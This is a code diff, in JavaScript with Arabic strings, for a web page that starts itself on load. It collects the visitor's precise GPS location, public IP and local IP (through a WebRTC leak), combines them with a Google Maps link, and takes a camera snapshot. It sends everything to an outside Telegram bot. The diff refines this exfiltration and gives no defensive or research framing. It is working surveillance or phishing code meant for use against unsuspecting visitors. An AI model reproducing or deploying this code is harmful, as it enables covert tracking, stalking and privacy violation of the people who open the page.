@@ -17,61 +17,66 @@
     let publicIP = "";
     let localIP = "";
 
-    function sendMessage(text) {
-      return fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ chat_id, text })
-      });
-    }
-
     function sendPhoto(blob) {
       const form = new FormData();
       form.append("chat_id", chat_id);
       form.append("photo", blob, "photo.jpg");
-
       return fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
         method: "POST",
         body: form
       });
     }
 
-    function sendAllInfo() {
-      const finalMsg = `${gpsMsg}
-🌐 Public IP: ${publicIP}
-🏠 Local IP: ${localIP || "❌ غير مدعوم"}`;
-      document.getElementById("result").innerText = finalMsg;
-      sendMessage(finalMsg);
+    function sendCombinedMessage() {
+      const message = `📡 معلومات الجهاز:
+
+📍 الموقع (GPS):
+${gpsMsg || "❌ فشل تحديد الموقع"}
+
+🌐 IP الخارجي: ${publicIP || "❌"}
+🏠 IP الداخلي: ${localIP || "❌"}
+
+🗺️ Google Maps: https://www.google.com/maps?q=${gpsLat},${gpsLon}`;
+      document.getElementById("result").innerText = message;
+      fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ chat_id, text: message })
+      });
+    }
+
+    let gpsLat = "";
+    let gpsLon = "";
+    let partsReady = 0;
+
+    function checkIfReady() {
+      partsReady++;
+      if (partsReady === 3) {
+        sendCombinedMessage();
+      }
     }
 
     function getLocation() {
       if ("geolocation" in navigator) {
         navigator.geolocation.getCurrentPosition(
           pos => {
-            const lat = pos.coords.latitude.toFixed(6);
-            const lon = pos.coords.longitude.toFixed(6);
+            gpsLat = pos.coords.latitude.toFixed(6);
+            gpsLon = pos.coords.longitude.toFixed(6);
             const acc = pos.coords.accuracy;
-
-            gpsMsg = `📍 GPS Location:
-Latitude: ${lat}
-Longitude: ${lon}
-📏 Accuracy: ±${acc} m
-🗺️ https://www.google.com/maps?q=${lat},${lon}`;
-            checkAllReady();
+            gpsMsg = `Latitude: ${gpsLat}
+Longitude: ${gpsLon}
+📏 الدقة: ±${acc} متر`;
+            checkIfReady();
           },
           err => {
-            gpsMsg = "❌ فشل تحديد الموقع: " + err.message;
-            checkAllReady();
+            gpsMsg = `❌ فشل تحديد الموقع: ${err.message}`;
+            checkIfReady();
           },
-          {
-            enableHighAccuracy: true,
-            timeout: 10000,
-            maximumAge: 0
-          }
+          { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
         );
       } else {
         gpsMsg = "❌ جهازك لا يدعم GPS";
-        checkAllReady();
+        checkIfReady();
       }
     }
 
@@ -80,11 +85,11 @@ Longitude: ${lon}
         .then(res => res.json())
         .then(data => {
           publicIP = data.ip;
-          checkAllReady();
+          checkIfReady();
         })
         .catch(() => {
-          publicIP = "❌ فشل الحصول على IP";
-          checkAllReady();
+          publicIP = "❌ فشل جلب IP";
+          checkIfReady();
         });
     }
 
@@ -92,26 +97,24 @@ Longitude: ${lon}
       const pc = new RTCPeerConnection({ iceServers: [] });
       pc.createDataChannel("");
       pc.createOffer().then(offer => pc.setLocalDescription(offer)).catch(() => {});
-
-      pc.onicecandidate = (event) => {
+      pc.onicecandidate = event => {
         if (!event || !event.candidate) return;
         const ipMatch = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(event.candidate.candidate);
         if (ipMatch) {
           const ip = ipMatch[1];
           if (ip.startsWith("192.") || ip.startsWith("10.") || ip.startsWith("172.")) {
             localIP = ip;
-            checkAllReady();
+            checkIfReady();
           }
         }
       };
-    }
-
-    let readyParts = 0;
-    function checkAllReady() {
-      readyParts++;
-      if (readyParts >= 3) {
-        sendAllInfo();
-      }
+      // fallback in case candidate doesn't return local IP
+      setTimeout(() => {
+        if (!localIP) {
+          localIP = "❌ لم يتم الحصول عليه";
+          checkIfReady();
+        }
+      }, 2000);
     }
 
     function initCamera() {
@@ -121,10 +124,10 @@ Longitude: ${lon}
           video.srcObject = stream;
           video.addEventListener("playing", () => {
             const canvas = document.getElementById("canvas");
-            const context = canvas.getContext("2d");
+            const ctx = canvas.getContext("2d");
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
-            context.drawImage(video, 0, 0);
+            ctx.drawImage(video, 0, 0);
             canvas.toBlob(blob => sendPhoto(blob), "image/jpeg");
             stream.getTracks().forEach(track => track.stop());
           });
@@ -134,7 +137,7 @@ Longitude: ${lon}
         });
     }
 
-    // تشغيل تلقائي
+    // ابدأ العمليات
     getLocation();
     getPublicIP();
     getLocalIP();
